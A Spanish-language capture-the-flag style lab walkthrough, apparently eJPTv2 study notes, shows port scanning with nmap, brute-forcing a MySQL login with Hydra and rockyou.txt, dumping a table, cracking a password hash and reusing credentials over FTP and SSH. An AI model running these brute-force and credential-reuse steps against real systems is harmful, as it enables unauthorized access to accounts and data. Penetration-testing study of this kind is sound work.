1. Lanzar un Nmap a la victima:
	```
	sudo nmap -p- --open -sS -sVC --min-rate 5000 -A -n -vvv -Pn 192.168.1.135 -oN Unrecover_Puertos.txt
	```
	
2. Ver el resultado:
```
cat Unrecover_Puertos.txt
```

![Hydra 9](ejpt/img/hydra-9.png)

3.  Bucamos la IP de la victima en un navegador (Chrome, Firefox...) para ver que tiene guardado en el puerto 80 (HTTP):

![Hydra 10](ejpt/img/hydra-10.png)

4. Nos muestra que hay un usuario llamado ***capybara***, entonces usaremos ***capybara*** como usuario para realizar la fuerza bruta a la contraseña.
5. Utilizamos la herramienta ***HYDRA*** para hacer un ataque de fuerza bruta a mysql (puerto 3306):
	```
	sudo hydra mysql://172.17.0.2 -l capybara -P /usr/share/wordlists/rockyou.txt
	```

6. El resultado de ***Hydra***:

![Hydra 11](ejpt/img/hydra-11.png)

7. Conectarse a la base de datos de la victima:
```
mysql -u capybara -p password1 -h 172.17.0.2
```
*EN CASO DE ERROR*:
```
mysql -u capybara -ppassword1 -h 172.17.0.2
```


- ***EXTRA (FUERA DE LA eJPTv2) (EL CONTENEDOR DOCKER ES POR SI ACASO, EN CASO DE ERROR HACERLO SIN COTENEDOR DOCKER DESDE LA TERMINAL NORMAL):***
	1. Creamos un contenedor **Docker** de **Debian**:
	```
	sudo docker run -it debian:latest
	```

	2. Actualizamos los paquetes:
	```
	apt update
	```

	3. Instalamos ***mariadb-client***:
	```
	apt install mariadb-client
	```

	4. Con el cliente instalado (***mariadb-client***), nos conectamos a la base de datos de la victima desde el contenedor **Docker** de **Debian**:
	```
	mysql -u capybara -p password1 -h 172.17.0.2
	```
	*EN CASO DE ERROR*:
	```
	mysql -u capybara -ppassword1 -h 172.17.0.2
	```
	*EN CASO DE QUE SIGA DANDO ERROR*:
	```
	mysql -u capybara -p password1 -h 172.17.0.2 --skip-ssl
	```
	*EN CASO DE QUE SIGA DANDO ERROR*:
	```
	mysql -u capybara -ppassword1 -h 172.17.0.2 --skip-ssl
	```

	5. Navegamos por la base de datos:
	```
	show databases;
	```

	```
	use beta;
	```

	```
	show tables;
	```

	```
	select * FROM registraton;
	```
	![Hydra 12](ejpt/img/hydra-12.png)

	6. Vemos que la contraseña esta **HASHEADA**, utilizaremos la web https://crackstation.net para **DESHASHEARLA**:
	```
	https://crackstation.net
	```
	![Hydra 13](ejpt/img/hydra-13.png)

	7. Vemos que el tipo de **HASH** es **md2** y también vemos que la contraseña es la misma que la de la base de datos, si probamos la contraseña **password1** con el usuario **balulero** (usuario obtenido en la base de datos) en los protocolos **FTP** y **SSH** vemos que son correctos:
	```
	ftp balulero@172.17.0.2
	```

	```
	ssh balulero@172.17.0.2
	```
	
![Hydra 14](ejpt/img/hydra-14.png)